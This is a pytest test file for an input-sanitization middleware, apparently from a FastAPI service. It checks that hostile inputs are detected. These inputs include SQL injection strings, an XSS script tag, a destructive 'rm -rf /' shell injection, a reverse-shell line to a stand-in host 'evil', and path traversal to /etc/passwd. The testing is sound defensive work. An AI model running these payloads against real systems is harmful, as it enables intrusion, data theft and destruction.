import pytest
from fast_api.middleware.input_guard import _extract_string_values, InputSanitizationMiddleware


class TestExtractStringValues:

    def test_flat_dict(self):
        values = _extract_string_values({"a": "hello", "b": "world"})
        assert "hello" in values
        assert "world" in values

    def test_nested_dict(self):
        values = _extract_string_values({"a": {"b": "deep"}})
        assert "deep" in values

    def test_list_values(self):
        values = _extract_string_values({"items": ["one", "two"]})
        assert "one" in values
        assert "two" in values

    def test_depth_limit(self):
        deeply_nested = {"a": {"b": {"c": {"d": {"e": {"f": {"g": "too_deep"}}}}}}}
        values = _extract_string_values(deeply_nested)
        assert "too_deep" not in values

    def test_plain_string(self):
        values = _extract_string_values("hello")
        assert values == ["hello"]

    def test_integer_ignored(self):
        values = _extract_string_values({"count": 42})
        assert values == []


class TestPatternDetection:

    def test_sql_union_detected(self):
        assert InputSanitizationMiddleware._check_patterns("UNION SELECT * FROM users") is True

    def test_sql_drop_detected(self):
        assert InputSanitizationMiddleware._check_patterns("DROP TABLE users") is True

    def test_exec_detected(self):
        assert InputSanitizationMiddleware._check_patterns("EXEC sp_MSForEachTable") is True

    def test_comment_bypass_detected(self):
        assert InputSanitizationMiddleware._check_patterns("1/**/UNION/**/SELECT") is True

    def test_null_byte_detected(self):
        assert InputSanitizationMiddleware._check_patterns("admin\x00") is True

    def test_xss_script_detected(self):
        assert InputSanitizationMiddleware._check_patterns("<script>alert(1)</script>") is True

    def test_shell_injection_detected(self):
        assert InputSanitizationMiddleware._check_patterns("; rm -rf /") is True

    def test_python_exec_detected(self):
        assert InputSanitizationMiddleware._check_patterns("; python -c 'import os'") is True

    def test_reverse_shell_detected(self):
        assert InputSanitizationMiddleware._check_patterns("; bash -i >& /dev/tcp/evil/4444 0>&1") is True

    def test_path_traversal_detected(self):
        assert InputSanitizationMiddleware._check_patterns("../../etc/passwd") is True

    def test_load_file_detected(self):
        assert InputSanitizationMiddleware._check_patterns("LOAD_FILE('/etc/passwd')") is True

    def test_group_concat_detected(self):
        assert InputSanitizationMiddleware._check_patterns("GROUP_CONCAT(username)") is True

    def test_safe_text_passes(self):
        assert InputSanitizationMiddleware._check_patterns("Hello World") is False

    def test_safe_nigerian_data_passes(self):
        assert InputSanitizationMiddleware._check_patterns("+2348012345678") is False

    def test_safe_json_value_passes(self):
        assert InputSanitizationMiddleware._check_patterns("Test delink request reason") is False
